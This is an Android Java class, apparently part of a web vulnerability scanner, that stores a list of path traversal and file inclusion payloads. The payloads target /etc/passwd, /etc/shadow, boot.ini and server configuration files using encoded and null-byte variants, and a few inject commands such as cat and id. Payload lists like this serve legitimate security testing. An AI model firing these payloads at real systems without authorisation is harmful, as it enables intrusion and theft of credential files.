package com.dibsyhex.droid10.vectormodels;

import android.util.Log;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Created by WHOIS on 07-03-2015.
 */
public class FileInclusionVectorModel {

    private static FileInclusionVectorModel fileInclusionVectorModel=new FileInclusionVectorModel();

    private static final String[]fileInclusionVectors=new String []{
            "../../../../../../../../../../../../etc/hosts%00",
            "../../../../../../../../../../../../etc/hosts",
            "../../boot.ini",
            "/../../../../../../../../%2A",
            "../../../../../../../../../../../../etc/passwd%00",
            "../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../etc/shadow%00",
            "../../../../../../../../../../../../etc/shadow",
            "/../../../../../../../../../../etc/passwd^^",
            "/../../../../../../../../../../etc/shadow^^",
            "/../../../../../../../../../../etc/passwd",
            "/../../../../../../../../../../etc/shadow",
            "/./././././././././././etc/passwd",
            "/./././././././././././etc/shadow",
            "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
            "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow",
            "/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd",
            "/..\\../..\\../..\\../..\\../..\\../..\\../etc/shadow",
            ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
            ".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow",
            "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00",
            "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow%00",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow%00",
            "%0a/bin/cat%20/etc/passwd",
            "%0a/bin/cat%20/etc/shadow",
            "%00/etc/passwd%00",
            "%00/etc/shadow%00",
            "%00../../../../../../etc/passwd",
            "%00../../../../../../etc/shadow",
            "/../../../../../../../../../../../etc/passwd%00.jpg",
            "/../../../../../../../../../../../etc/passwd%00.html",
            "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
            "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
            "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00",
            "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00",
            "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00",
            "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini",
            "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini",
            "\\&apos;/bin/cat%20/etc/passwd\\&apos;",
            "\\&apos;/bin/cat%20/etc/shadow\\&apos;",
            "../../../../../../../../conf/server.xml",
            "/../../../../../../../../bin/id|",
            "C:/inetpub/wwwroot/global.asa",
            "C:\\inetpub\\wwwroot\\global.asa",
            "C:/boot.ini",
            "C:\boot.ini",
            "../../../../../../../../../../../../localstart.asp%00",
            "../../../../../../../../../../../../localstart.asp",
            "../../../../../../../../../../../../boot.ini%00",
            "../../../../../../../../../../../../boot.ini",
            "/./././././././././././boot.ini",
            "/../../../../../../../../../../../boot.ini%00",
            "/../../../../../../../../../../../boot.ini",
            "/..\\../..\\../..\\../..\\../..\\../..\\../boot.ini",
            "/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini",
            "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini%00",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
            "/../../../../../../../../../../../boot.ini%00.html",
            "/../../../../../../../../../../../boot.ini%00.jpg",
            "/.../.../.../.../.../",
            "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini"
    };




    private FileInclusionVectorModel(){

    }

    public static FileInclusionVectorModel getInstance(){
        return fileInclusionVectorModel;
    }







    public static List getVectorsList(){
        List<String>vectorsList=null;
        try{
            List<String>list= Arrays.asList(fileInclusionVectors);
            vectorsList=new ArrayList<String>(list);

        }catch (Exception e){
            Log.e("ERROR", "getVectorList():" + e.toString());
        }


        return vectorsList;
    }


    public static List getUserDefinedVectorList(){
        List<String>vectorsList=new ArrayList<String>();

        return vectorsList;
    }

    public static List getInbuiltVectorList(){
        List<String>vectorsList=new ArrayList<String>();

        return vectorsList;
    }


}
